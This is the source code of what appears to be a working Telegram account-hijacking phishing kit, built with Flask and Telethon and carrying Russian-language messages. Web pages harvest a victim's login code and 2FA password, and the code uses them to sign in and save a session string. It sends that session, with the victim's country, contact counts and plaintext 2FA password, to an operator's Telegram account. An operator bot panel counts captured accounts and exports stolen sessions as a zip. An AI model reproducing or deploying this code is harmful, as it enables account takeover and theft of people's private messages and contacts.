import os, json, asyncio, threading, time, zipfile
from io import BytesIO
from datetime import datetime
from flask import Flask, request, jsonify, render_template, redirect
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession, MemorySession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.contacts import GetContactsRequest
import phonenumbers

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

app = Flask(__name__, static_folder='static', template_folder='templates')

def update_logs():
    logs_file = "logs.json"
    if os.path.exists(logs_file):
        with open(logs_file) as f:
            logs = json.load(f)
    else:
        logs = {"total": 0, "by_day": {}, "by_month": {}}
    logs["total"] += 1
    today = datetime.today().strftime("%Y-%m-%d")
    month = datetime.today().strftime("%Y-%m")
    logs["by_day"][today] = logs["by_day"].get(today, 0) + 1
    logs["by_month"][month] = logs["by_month"].get(month, 0) + 1
    with open(logs_file, "w") as f:
        json.dump(logs, f)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/verify', methods=['GET'])
def verify_page():
    return render_template("verify.html")

@app.route('/2fa', methods=['GET', 'POST'])
def enter_2fa():
    if request.method == 'GET':
        return render_template("2fa.html")

    password = request.form.get("password")
    try:
        phone = next(f.replace(".json", "") for f in os.listdir("codes"))
        with open(f"codes/{phone}.json", "r") as f:
            data = json.load(f)
    except:
        return "❌ Не найдены сохранённые данные сессии"

    session = StringSession(data["session"])

    async def sign_in_with_2fa():
        client = TelegramClient(session, API_ID, API_HASH)
        await client.connect()
        try:
            await client.sign_in(password=password)
        except Exception as e:
            await client.disconnect()
            return f"❌ Неверный пароль 2FA: {str(e)}"

        string_session = client.session.save()
        me = await client.get_me()
        dialogs = await client.get_dialogs()
        contacts = await client(GetContactsRequest(hash=0))

        try:
            parsed = phonenumbers.parse(f"+{me.phone}")
            country = phonenumbers.region_code_for_number(parsed)
        except:
            country = "Неизвестна"

        stats = (
            f"🌍 Страна: {country}\n"
            f"📨 Диалогов: {len(dialogs)}\n"
            f"👥 Контактов: {len(contacts.users)}\n"
            f"🔐 2FA: {password}"
        )

        bot = TelegramClient("bot_sender", API_ID, API_HASH)
        await bot.start(bot_token=BOT_TOKEN)

        session_bytes = BytesIO(string_session.encode())
        session_bytes.name = f"{me.phone}.session"

        await bot.send_file(ADMIN_ID, file=session_bytes, caption=stats)
        await bot.disconnect()

        os.makedirs("received_sessions", exist_ok=True)
        with open(f"received_sessions/{me.phone}.session", "wb") as f:
            f.write(string_session.encode())

        await client.disconnect()
        os.remove(f"codes/{phone}.json")
        update_logs()

        return "<h3>✅ Авторизация с 2FA успешна. Сессия отправлена.</h3>"

    return asyncio.run(sign_in_with_2fa())

@app.route('/verify', methods=['POST'])
def verify():
    data = request.get_json()
    code = data.get("code")
    try:
        phone = next(f.replace(".json", "") for f in os.listdir("codes"))
        with open(f"codes/{phone}.json", "r") as f:
            info = json.load(f)
    except:
        return jsonify({"success": False, "message": "Сессия не найдена"})

    session = StringSession(info["session"])
    code_hash = info["phone_code_hash"]

    async def auth():
        client = TelegramClient(session, API_ID, API_HASH)
        await client.connect()
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
        except SessionPasswordNeededError:
            await client.disconnect()
            return {"success": False, "need_2fa": True}
        except Exception as e:
            return {"success": False, "message": str(e)}

        me = await client.get_me()
        dialogs = await client.get_dialogs()
        contacts = await client(GetContactsRequest(hash=0))

        try:
            parsed = phonenumbers.parse(f"+{me.phone}")
            country = phonenumbers.region_code_for_number(parsed)
        except:
            country = "Неизвестна"

        string_session = client.session.save()
        stats = (
            f"🌍 Страна: {country}\n"
            f"📨 Диалогов: {len(dialogs)}\n"
            f"👥 Контактов: {len(contacts.users)}\n"
            f"🔐 2FA: Нет"
        )

        bot = TelegramClient("bot_sender", API_ID, API_HASH)
        await bot.start(bot_token=BOT_TOKEN)

        session_bytes = BytesIO(string_session.encode())
        session_bytes.name = f"{me.phone}.session"

        await bot.send_file(ADMIN_ID, file=session_bytes, caption=stats)
        await bot.disconnect()

        os.makedirs("received_sessions", exist_ok=True)
        with open(f"received_sessions/{me.phone}.session", "wb") as f:
            f.write(string_session.encode())

        await client.disconnect()
        os.remove(f"codes/{phone}.json")
        update_logs()

        return {"success": True}

    return jsonify(asyncio.run(auth()))

# === Telegram-бот: статистика и выгрузка ===
bot_listener = TelegramClient(MemorySession(), API_ID, API_HASH)

@bot_listener.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    buttons = [
        [Button.inline("📈 День", b"stats_day"), Button.inline("📊 Месяц", b"stats_month")],
        [Button.inline("📦 Выгрузить сессии", b"get_sessions")]
    ]
    await event.respond("Панель управления:", buttons=buttons)

@bot_listener.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    logs_file = "logs.json"

    if data.startswith("stats_"):
        if not os.path.exists(logs_file):
            return await event.respond("Нет логов.")
        with open(logs_file) as f:
            logs = json.load(f)
        if data == "stats_day":
            key = datetime.today().strftime("%Y-%m-%d")
            count = logs.get("by_day", {}).get(key, 0)
            await event.respond(f"📈 Сегодня: {count}")
        elif data == "stats_month":
            key = datetime.today().strftime("%Y-%m")
            count = logs.get("by_month", {}).get(key, 0)
            await event.respond(f"📊 За месяц: {count}")
        else:
            await event.respond(f"📁 Всего логов: {logs.get('total', 0)}")

    elif data == "get_sessions":
        folder = "received_sessions"
        meta_file = "sent_sessions.json"
        zip_path = "sessions.zip"
        sent = {}
        if os.path.exists(meta_file):
            with open(meta_file, "r") as f:
                raw = json.load(f)
                sent = {f: 0 for f in raw} if isinstance(raw, list) else raw
        files = [f for f in os.listdir(folder) if f.endswith(".session")]
        fresh = []
        for f in files:
            path = os.path.join(folder, f)
            mtime = os.path.getmtime(path)
            if f not in sent or abs(mtime - sent[f]) > 0.1:
                fresh.append(f)
        if not fresh:
            return await event.respond("У вас нет новых сессий ✅")
        with zipfile.ZipFile(zip_path, "w") as zipf:
            for f in fresh:
                zipf.write(os.path.join(folder, f), arcname=f)
        await event.client.send_file(
            ADMIN_ID,
            zip_path,
            caption=f"📦 В архиве *{len(fresh)}* новых сессий",
            parse_mode="Markdown"
        )
        os.remove(zip_path)
        for f in fresh:
            sent[f] = os.path.getmtime(os.path.join(folder, f))
        with open(meta_file, "w") as f:
            json.dump(sent, f)

# === Запуск ===
async def run_bot_listener():
    try:
        await bot_listener.start(bot_token=BOT_TOKEN)
        await bot_listener.run_until_disconnected()
    except FloodWaitError as e:
        print(f"FloodWait: ждём {e.seconds} сек...")
        time.sleep(e.seconds)
        await run_bot_listener()

if __name__ == '__main__':
    def start_all():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot_listener())

    threading.Thread(target=start_all, daemon=True).start()
    print("✅ Telegram-бот запущен")
    print("🌐 Flask доступен по адресу: http://127.0.0.1:5000")
    app.run(debug=True, use_reloader=False)
